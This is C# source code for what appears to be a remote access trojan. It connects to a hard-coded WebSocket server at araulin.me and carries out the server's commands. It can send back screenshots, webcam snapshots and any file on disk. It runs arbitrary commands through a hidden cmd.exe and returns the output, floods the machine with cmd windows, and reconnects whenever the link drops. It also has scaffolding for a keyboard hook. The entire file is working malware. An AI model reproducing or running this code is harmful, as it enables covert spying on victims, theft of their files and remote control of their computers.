using System;
using System.Diagnostics;
using WebSocketSharp;
using System.Threading;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Emgu.CV;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace A3
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
            using (var ws = new WebSocket("ws://araulin.me"))
            {
                ws.OnMessage += (sender, e) =>
                {
                    String message;
                    message = e.Data;

                    if (message == "screenshot")
                    {
                        ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
                        Bitmap memoryImage;
                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height);
                        Size s = new Size(memoryImage.Width, memoryImage.Height);
                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                        
                        MemoryStream stream = new MemoryStream();
                        memoryImage.Save(stream, ImageFormat.Bmp);
                        byte[] imageBytes = stream.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);
                        ws.Send("##SCREENSHOT##"+ base64String);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if(message == "webcam_snap")
                    {
                        VideoCapture capture = new VideoCapture();
                        Bitmap image = capture.QueryFrame().Bitmap;
                        MemoryStream ms = new MemoryStream();
                        image.Save(ms, ImageFormat.Jpeg);
                        byte[] byteImage = ms.ToArray();
                        var SigBase64 = Convert.ToBase64String(byteImage);
                        ws.Send("##WEBCAM_SNAP##"+SigBase64);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }else if(message.StartsWith("crash_pc"))
                    {
                        int times = System.Convert.ToInt32(message.Replace("crash_pc ",""));
                        for(int s = 0; s < times; s++){
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.Start();
                        }
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }else if(message == "speedtest")
                    {
                        const string tempfile = "tempfile.tmp";
                        System.Net.WebClient webClient = new System.Net.WebClient();
                        Stopwatch sww = Stopwatch.StartNew();
                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
                        sww.Stop();

                        FileInfo fileInfo = new FileInfo(tempfile);
                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
                        ws.Send("##SPEEDTEST##" + jj);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }else if(message == "SENDHELLO"){
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if(message.StartsWith("upload_file"))
                    {   
                        string filepath = message.Replace("upload_file ","");
                        if (System.IO.File.Exists(filepath)){
                            FileInfo info = new FileInfo(filepath);
                            ws.Send("##FILENAME##" + filepath);
                            ws.Send(info);
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                        }else{
                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                        }
                    }
                    else
                    {
                        Process cmd = new Process();
                        cmd.StartInfo.FileName = "cmd.exe";
                        cmd.StartInfo.RedirectStandardInput = true;
                        cmd.StartInfo.RedirectStandardOutput = true;
                        cmd.StartInfo.CreateNoWindow = true;
                        cmd.StartInfo.UseShellExecute = false;
                        cmd.Start();

                        cmd.StandardInput.WriteLine(message);
                        cmd.StandardInput.Flush();
                        cmd.StandardInput.Close();
                        cmd.WaitForExit();
                        ws.Send(cmd.StandardOutput.ReadToEnd());
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                };
                ws.OnClose += (sender, e) => {
                    Stopwatch sw = new Stopwatch();
                    sw.Start();
                    while (true)
                    {
                        if(sw.ElapsedMilliseconds > 2000)
                        {
                            ws.Connect();
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                            break;
                        }
                    }
                };
                ws.Connect();
                ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                new ManualResetEvent(false).WaitOne();
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if ((Keys)vkCode == Keys.PrintScreen)
                {
                    //CaptureScreen();
                }
                Console.WriteLine((Keys)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

    }
}